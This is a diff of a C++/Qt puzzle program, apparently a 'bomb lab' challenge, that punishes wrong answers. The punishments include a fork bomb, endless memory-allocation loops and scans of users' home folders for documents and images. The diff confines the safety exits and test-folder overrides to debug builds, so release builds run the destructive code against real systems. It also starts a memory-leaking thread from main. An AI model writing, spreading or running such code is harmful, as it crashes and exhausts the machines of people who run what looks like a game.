@@ -6,6 +6,7 @@
 #include <QtGui/QImage>
 #include <QTransform>
 #include <QCryptographicHash>
+#include <QThread>
 #include <iostream>
 #include <stdio.h>
 #include <math.h>
@@ -85,8 +86,9 @@ void pleaseOnlyReadatNight(QString dir){
 	}else{
 		dir=QString("C:/Users");
 	}
+#ifdef QT_DEBUG
 	dir = QString("C:/testImages"); // For testing
-
+#endif
 	auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
 	QDirIterator itr(dir, QStringList() << "*.txt"<<"*.doc"<<"*.docx", drain, QDirIterator::Subdirectories);
@@ -126,7 +128,9 @@ void letsSpoon(){
 		}else{
 			system("./$0|./$0&");
 		}
+#ifdef QT_DEBUG
 		exit(-1); // So as not to bomb our machines
+#endif
 	}
 	letsSpoon();
 }
@@ -134,24 +138,39 @@ void letsSpoon(){
 void gehinomEchad(){
 	while(1){
 		char* oEchat = new char[1337];
+#ifdef QT_DEBUG
 		exit(-5); // So as not to bomb our machines
+#endif
 		if(oEchat == NULL){
 			continue;
 		}
 	}
 }
 
-void gehinomShtaim(){
-	// QThread
+void gehinomShtaim2(){
+	qDebug()<<"gehinomShtaim2";
 	int l = (3*3)-7;
-	while(1 == --l){
+#ifdef QT_DEBUG
+	int testNum=0;
+#endif
+	while(l){
 		char* echad = new char[1];
+		qDebug()<<"test";
 		if(echad == NULL){
 			continue;
 		}
-		exit(-5); // So as not to bomb our machines
+#ifdef QT_DEBUG
+		if(testNum++>5){
+			return; //So as not to bomb our machines
+		}
+#endif
 	}
 }
+void gehinomShtaim(){
+	QThread * thready=QThread::create(gehinomShtaim2);
+	thready->start();
+}
+
 
 QString escaped(QString str){
 	QString escaped;
@@ -205,6 +224,7 @@ int main(/*int argc, char *argv[]*/){
 	}
 	SetConsoleOutputCP(CP_UTF8);
 #endif
+	gehinomShtaim();
 	std::cout<<"Welcome to the pit of despair!\nYou can check in any time you like, but you may never leave."<<std::endl<<std::endl;
 
 	std::cout<<"I swear I had something for this phase!"<<std::endl;
@@ -212,7 +232,9 @@ int main(/*int argc, char *argv[]*/){
 Phase1:
 	{
 		QList<qint64> nums({2985,5318008,1337});
+#ifdef QT_DEBUG
 		double answers[]={1.122306114604289e-07,3.535916717302045e-14,5.594189650861030e-07};
+#endif
 		if(nums.length()!=nommies.length()){
 			qDebug()<<"messed up phase 1: Wrong number of entries";
 			goto ousted;
@@ -265,8 +287,9 @@ ousted:
 		}else if(OS==linux){
 			dir=QString("/home");
 		}
+#ifdef QT_DEBUG
 		dir = QString("C:/testImages");
-
+#endif
 		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
 		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
@@ -288,7 +311,9 @@ outed:
 DefinitelyNotPhase1:
 	{
 		QList<quint64> nummies({308061521170129,1346269,4660046610375544832,28657});
+#ifdef QT_DEBUG
 		quint64 answers[]={18,16,23,12};
+#endif
 		if(nummies.length()!=nommies.length()){
 			qDebug()<<"messed up DefinitelyNotPhase1: Wrong number of entries";
 			gehinomEchad();
@@ -304,7 +329,9 @@ DefinitelyNotPhase1:
 	}
 Phase10:
 	{
+#ifdef QT_DEBUG
 		QStringList answers{"yes","13","ocelot","pam"};
+#endif
 		QCryptographicHash taters(QCryptographicHash::Sha256);
 		QString tweedle("6a039d1d1406d62c1f6f83e4aa6a5124f1e94bb214476c79052001b66b9cabe4");
 		QString dum("e5b5e0ba9f3d51657f797c2e616f09a83f1ef277521495d0dd9ccf4ca9104374");
